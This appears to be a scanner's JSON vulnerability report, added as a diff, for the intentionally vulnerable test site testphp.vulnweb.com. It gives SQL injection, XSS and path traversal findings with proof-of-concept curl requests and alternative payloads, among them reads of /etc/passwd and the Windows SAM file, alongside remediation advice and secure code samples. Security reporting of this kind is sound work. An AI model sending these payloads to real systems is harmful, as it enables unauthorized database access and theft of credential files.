@@ -1,0 +1,255 @@
+{
+  "metadata": {
+    "exportedAt": "2025-10-30T12:34:56.789Z",
+    "totalVulnerabilities": 4,
+    "generator": "ZerOn Security Scanner"
+  },
+  "summary": {
+    "critical": 1,
+    "high": 2,
+    "medium": 0,
+    "low": 0,
+    "info": 1
+  },
+  "vulnerabilities": [
+    {
+      "id": "v2",
+      "index": 1,
+      "type": "SQL Injection",
+      "severity": "critical",
+      "cvss": 9.8,
+      "endpoint": "/list.php",
+      "parameter": "id",
+      "description": "The 'id' parameter in list.php is vulnerable to SQL injection attacks",
+      "payload": "' OR '1'='1",
+      "poc": {
+        "description": "SQL Injection vulnerability in parameter allows unauthorized database access",
+        "vulnerable_request": {
+          "method": "GET",
+          "url": "http://testphp.vulnweb.com/list.php?id=%27%20OR%20%271%27%3D%271",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+          },
+          "curl": "curl -X GET \"http://testphp.vulnweb.com/list.php?id=%27%20OR%20%271%27%3D%271\" \\\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\""
+        },
+        "expected_response": {
+          "status_code": 200,
+          "indicators": [
+            "SQL syntax error",
+            "mysql_fetch_array()",
+            "MySQL error near",
+            "Warning: mysql_",
+            "Database error"
+          ],
+          "example": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \"'1'='1"
+        },
+        "alternative_payloads": [
+          "id=1' OR '1'='1",
+          "id=1' OR 1=1 --",
+          "id=1' UNION SELECT NULL,NULL,NULL --",
+          "id=1' AND SLEEP(5) --",
+          "id=1' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
+        ]
+      },
+      "remediation": {
+        "immediate": [
+          "Use parameterized queries/prepared statements",
+          "Implement input validation and sanitization",
+          "Apply least privilege principle to database accounts"
+        ],
+        "long_term": [
+          "Conduct security code review",
+          "Implement WAF rules",
+          "Regular security testing",
+          "Developer security training"
+        ],
+        "code_example": "\n// VULNERABLE\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE\nconst query = \"SELECT * FROM users WHERE id = ?\";\ndb.query(query, [userId]);\n        "
+      },
+      "references": [
+        {
+          "title": "OWASP SQL Injection",
+          "url": "https://owasp.org/www-community/attacks/SQL_Injection"
+        },
+        {
+          "title": "CWE-89: SQL Injection",
+          "url": "https://cwe.mitre.org/data/definitions/89.html"
+        }
+      ]
+    },
+    {
+      "id": "v3",
+      "index": 2,
+      "type": "Reflected XSS",
+      "severity": "high",
+      "cvss": 7.5,
+      "endpoint": "/search.php",
+      "parameter": "q",
+      "description": "User input is not properly sanitized before being reflected in responses",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "poc": {
+        "description": "Reflected Cross-Site Scripting allows execution of arbitrary JavaScript",
+        "vulnerable_request": {
+          "method": "GET",
+          "url": "http://testphp.vulnweb.com/search.php?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+          },
+          "curl": "curl -X GET \"http://testphp.vulnweb.com/search.php?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E\" \\\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\""
+        },
+        "expected_response": {
+          "status_code": 200,
+          "indicators": [
+            "JavaScript code appears unescaped in HTML",
+            "Payload is reflected in page source",
+            "Script tag executed"
+          ],
+          "example": "Page source contains: <script>alert(\"XSS\")</script>"
+        },
+        "alternative_payloads": [
+          "q=<svg onload=alert('XSS')>",
+          "q=<img src=x onerror=alert('XSS')>",
+          "q=<iframe src=\"javascript:alert('XSS')\"></iframe>",
+          "q=<body onload=alert('XSS')>",
+          "q=\"><script>alert('XSS')</script>"
+        ]
+      },
+      "remediation": {
+        "immediate": [
+          "Encode all user input in output context",
+          "Implement Content Security Policy (CSP)",
+          "Use templating engines with auto-escaping"
+        ],
+        "long_term": [
+          "Input validation on server-side",
+          "Output encoding based on context",
+          "Security headers configuration",
+          "Regular security assessments"
+        ],
+        "code_example": "\n// VULNERABLE\nres.send(\"<h1>\" + userInput + \"</h1>\");\n\n// SECURE\nconst escaped = userInput\n  .replace(/&/g, \"&amp;\")\n  .replace(/</g, \"&lt;\")\n  .replace(/>/g, \"&gt;\")\n  .replace(/\"/g, \"&quot;\")\n  .replace(/'/g, \"&#x27;\");\nres.send(\"<h1>\" + escaped + \"</h1>\");\n        "
+      },
+      "references": [
+        {
+          "title": "OWASP Cross-Site Scripting (XSS)",
+          "url": "https://owasp.org/www-community/attacks/xss/"
+        },
+        {
+          "title": "CWE-79: Improper Neutralization of Input",
+          "url": "https://cwe.mitre.org/data/definitions/79.html"
+        }
+      ]
+    },
+    {
+      "id": "v4",
+      "index": 3,
+      "type": "Path Traversal",
+      "severity": "high",
+      "cvss": 7.2,
+      "endpoint": "/viewfile.php",
+      "parameter": "file",
+      "description": "Insufficient input validation allows accessing files outside intended directory",
+      "payload": "../../etc/passwd",
+      "poc": {
+        "description": "Path Traversal vulnerability allows access to files outside intended directory",
+        "vulnerable_request": {
+          "method": "GET",
+          "url": "http://testphp.vulnweb.com/viewfile.php?file=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json, text/plain, */*"
+          },
+          "curl": "curl -X GET \"http://testphp.vulnweb.com/viewfile.php?file=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\" \\\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" \\\n  -v"
+        },
+        "expected_response": {
+          "status_code": 200,
+          "indicators": [
+            "root:x:0:0",
+            "Linux system configuration",
+            "File contents displayed",
+            "Directory listing appears"
+          ],
+          "example": "Sensitive file contents (e.g., /etc/passwd) are returned"
+        },
+        "alternative_payloads": [
+          "file=../../../etc/passwd",
+          "file=..\\..\\..\\windows\\system32\\config\\sam",
+          "file=....//....//....//etc/passwd",
+          "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "file=..%252f..%252f..%252fetc%252fpasswd"
+        ]
+      },
+      "remediation": {
+        "immediate": [
+          "Validate file paths against whitelist",
+          "Reject requests with '..' or similar patterns",
+          "Use realpath() to resolve symlinks"
+        ],
+        "long_term": [
+          "Implement proper access controls",
+          "Run application with least privilege",
+          "Regular file system audits",
+          "Security testing for path traversal"
+        ],
+        "code_example": "\n// VULNERABLE\nfs.readFile(userPath, 'utf8', callback);\n\n// SECURE\nconst path = require('path');\nconst safePath = path.resolve(baseDir, userPath);\nif (!safePath.startsWith(baseDir)) {\n  throw new Error('Invalid path');\n}\nfs.readFile(safePath, 'utf8', callback);\n        "
+      },
+      "references": [
+        {
+          "title": "OWASP Path Traversal",
+          "url": "https://owasp.org/www-community/attacks/Path_Traversal"
+        },
+        {
+          "title": "CWE-22: Path Traversal",
+          "url": "https://cwe.mitre.org/data/definitions/22.html"
+        }
+      ]
+    },
+    {
+      "id": "v1",
+      "index": 4,
+      "type": "Old Framework",
+      "severity": "info",
+      "cvss": null,
+      "endpoint": "/index.php",
+      "parameter": null,
+      "description": "Outdated framework version detected with known vulnerabilities",
+      "payload": null,
+      "poc": {
+        "description": "Outdated framework version detected with known vulnerabilities",
+        "vulnerable_request": {
+          "method": "GET",
+          "url": "http://testphp.vulnweb.com/index.php",
+          "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+          },
+          "curl": "curl -I \"http://testphp.vulnweb.com/index.php\" \\\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\""
+        },
+        "expected_response": {
+          "status_code": 200,
+          "indicators": [
+            "X-Powered-By header reveals outdated version",
+            "Meta generator tag shows old version",
+            "Server header contains version info"
+          ],
+          "example": "X-Powered-By: PHP/5.2.17"
+        },
+        "alternative_payloads": []
+      },
+      "remediation": {
+        "immediate": [
+          "Identify current framework version",
+          "Plan framework upgrade timeline",
+          "Review security advisories"
+        ],
+        "long_term": [
+          "Upgrade to latest stable version",
+          "Establish patch management process",
+          "Regular dependency updates",
+          "Security monitoring"
+        ]
+      },
+      "references": []
+    }
+  ]
+}
